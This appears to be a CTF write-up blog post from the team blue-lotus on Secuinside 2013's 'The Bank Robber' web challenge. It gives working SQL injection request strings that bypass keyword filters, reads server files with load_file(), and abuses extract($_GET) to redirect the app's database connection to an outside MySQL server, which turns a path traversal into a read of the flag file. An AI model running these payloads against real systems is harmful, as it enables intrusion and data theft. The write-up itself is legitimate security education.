@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>secuinside ctf web The Bank Robber writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="The Bank Robber This is an excelent challenge. Thanks for the awesome CTF. We waste a lot of time in dealing with the SQL injection part. We found &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/secuinside-ctf-web-the-bank-robber-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Secuinside Ctf Web the Bank Robber Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>The Bank Robber</h2>
+
+<p>This is an excelent challenge. Thanks for the awesome CTF.</p>
+
+<p>We waste a lot of time in dealing with the SQL injection part.</p>
+
+<p>We found the SQL injection vulnerability in <code>./M.list</code> .</p>
+
+<p>The server use mod_rewrite to modify the incoming URL request. It seems that the sever split the URL by <code>'.'</code>.</p>
+
+<p>The SQL query is</p>
+
+<pre><code>    select * from hacked_list where $column like '%$word%' order by time desc;
+</code></pre>
+
+<p>When we GET <code>./M.list.idx.1</code>, it was translated to the query</p>
+
+<pre><code>    select * from hacked_list where idx like '%1%' order by time desc;
+</code></pre>
+
+<p>The $word is quoted, but idx seems to be not filtered.</p>
+
+<p><code>GET ./M.list.idx&amp;lt;30--.1</code> returns 29 results.</p>
+
+<p>At first, we use %23(&#8216;#&#8217;) to comment out the rest part of the query. But it seems useless. (We are not familiar with mod_rewrite&#8230;) Later, we found &#8216;&#8211;&#8217; took effect because &#8216;&ndash;&#8217; won&#8217;t be escaped.</p>
+
+<p><code>GET ./M.list.idx&amp;lt;=(select ascii(substring(user(),1,1)))-80--.1</code> </br></p>
+
+<p>We use blind injection to get some useless information such as user(), database(), version()&#8230;</p>
+
+<p>But we don&#8217;t know how to query the information_schema database to get more information about the database structure, because the <code>'.'</code> is used as the split point in the URL.</p>
+
+<p>Moreover, We don&#8217;t know how to use <code>order by 1</code> or <code>and 1=1</code> to gain deeper information about this injection. We thought the $column is strictly filtered.. We were confused then.</p>
+
+<p>Flanker accidently found that <code>./M.list.id%2bx.1</code> returns normal page. I fell deep in thought.</p>
+
+<p>I realized that the URL was unescaped twice (it is evident if I were familiar with mod_rewrite) and filtered space(<code>' '</code>). The transformation is <code>'%2b' =&amp;gt; '+' =&amp;gt; ' ' =&amp;gt; ''</code></p>
+
+<p>Then I knew how to use <code>'.'</code> in the query and what&#8217;s wrong with the <code>order by</code> and other clauses.</p>
+
+<p>I use <code>'%252e'</code> to represent <code>'.'</code> and <code>'%252f%252a%252a%252f'('/**/')</code> to represent <code>'&lt;br /&gt;&lt;br /&gt;
+'</code>. (In fact, <code>'/**/'</code> is also effective)</p>
+
+<p><code>order by</code> is filtered to <code>orderby</code>, but <code>order/**/by</code> is effective.</p>
+
+<p>I found <code>order/**/by/**/1</code> returns normal page, but <code>order/**/by/**/2</code> returns empty page, so there was only one column in the SQL query.</p>
+
+<p>But it went wrong when I constructed a &#8216;union select&#8217; query. Then I found &#8216;union&#8217;, &#8216;select&#8217; and &#8216;from&#8217; was filtered.</p>
+
+<p>GET <code>'./M.idx=1-select-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-union-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-from-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-unselection-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-selunionect-.1'</code> Empty</p>
+
+<p>GET <code>'./M.idx=1-frunselectionom-.1'</code> Normal</p>
+
+<p>GET <code>'./M.idx=1-   frunselectionom-.1'</code> Normal</p>
+
+<p>so the filter function might be</p>
+
+<blockquote><blockquote><p>replace &#8216;select&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216;union&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216;from&#8217; to &#8221; in $column</p>
+
+<p>replace &#8216; &#8216; to &#8221; in $column</p></blockquote></blockquote>
+
+<p>It was easy to find that <code>'Select', 'Union', 'From'</code> were not filtered.</p>
+
+<p>So I use</p>
+
+<pre><code>http://1.234.27.139:61080/M.list.1=2%252f%252a%252a%252fUnion%252f%252a%252a%252fSelect%252f%252a%252a%252f1,column_name,3,4%252f%252a%252a%252fFrom%252f%252a%252a%252finformation_schema%252ecolumns%252f%252a%252a%252fwhere%252f%252a%252a%252ftable_name=0x6861636b65645f6c697374--.a
+</code></pre>
+
+<p>to view all the information in the database.</p>
+
+<p>We were stucked soon. Because there was nothing special in the database.</p>
+
+<p>But we found we could load files from the server. The only way to go on was to use load&#95;file() to read files from server. (load&#95;file() is also filtered so we use Load_File())</p>
+
+<p>Having tried many filenames, Flanker (again~) found the the <code>'/site/.htaccess'</code> is readable. So we could get some special information in source code.</p>
+
+<p>The HINT showed that the flag was in <code>'/var/lib/php5/FLAG'</code>, we could read the file through the vulnerability in the source code.</p>
+
+<pre><code> 45 if (!ini_get("register_globals")) extract($_GET);
+ ...
+ 47 include_once $_BHVAR['path_lib']."database.php";
+ 48 include_once $_BHVAR['path_module']."_system/functions.php";
+ ...
+ 64 $head = $_BHVAR['path_layout'].get_layout($_skin, 'head');
+ ...
+ 67 echo file_get_contents($head);
+ ...
+ 70     case "P" : echo file_get_contents($_BHVAR['path_page']."/".$_act."/_main.php"); break;
+ 71     case "M" : include_once $_BHVAR['path_module']."/".$_act."/_main.php"; break;
+</code></pre>
+
+<p>get_layout() was defined in <code>'./modules/_system/functions.php'</code></p>
+
+<pre><code> 10  function get_layout($layout, $pos){
+ 11     $result = mysql_query("select path from _BH_layout where layout_name='$layout' and position='$pos'");
+ 12     $row = mysql_fetch_array($result);
+ 13     if (!isset($row['path'])){
+ 14         if ($pos = 'head'){
+ 15             return "./reverted/h.htm";
+ 16         } else {
+ 17             return "./reverted/f.htm";
+ 18         }
+ 19     }
+ 20     return $row['path'];
+ 21  }
+</code></pre>
+
+<p>In line 45, we could register variables in $_GET, but it was escaped.</p>
+
+<p>In line 70/71, we could read/include files, but we could not truncate the suffix <code>'/_main.php'</code>.</p>
+
+<p>Since we could register globals, we could modify some variable such as <code>$_BHVAR</code>.</p>
+
+<p>The database connection settings were stored in <code>./lib/database.php</code>. If we change the $&#95;BHVAR[&lsquo;path&#95;lib&rsquo;], the <code>./lib/database.php</code> could not be included correctly, we could use our own mysql server to answer the query.</p>
+
+<p>Then we create a table for this challenge. Thanks aay for offerring vps.</p>
+
+<pre><code> create table _BH_layout(path varchar(50), layout_name varchar(50), position varchar(50));
+ insert _BH_layout values('../../../../../var/lib/php5/FLAG', '1', 'head');
+
+http://1.234.27.139:61080/Main_Site/TBR.php?_type=P&amp;_skin=1&amp;_BHVAR[path_module]=./modules/&amp;_BHVAR[db][host]=50.115.47.187&amp;_BHVAR[db][user]=BH&amp;_BHVAR[db][pass]=BHBH&amp;_BHVAR[db][name]=BH
+</code></pre>
+
+<p>key is&#8230; @<em>Y0UR&#95;EY3&#95;LEE_SIN</em>@</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">slipper</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/secuinside-ctf-web-the-bank-robber-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/secuinside-ctf-web-the-bank-robber-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/secuinside-ctf-quals-2013-givemeshell-writeup/" title="Previous Post: secuinside CTF Quals 2013 givemeshell writeup">&laquo; secuinside CTF Quals 2013 givemeshell writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/secuinsidectf-2013-web-banking-writeup/" title="Next Post: secuinsideCTF 2013 web banking writeup">secuinsideCTF 2013 web banking writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
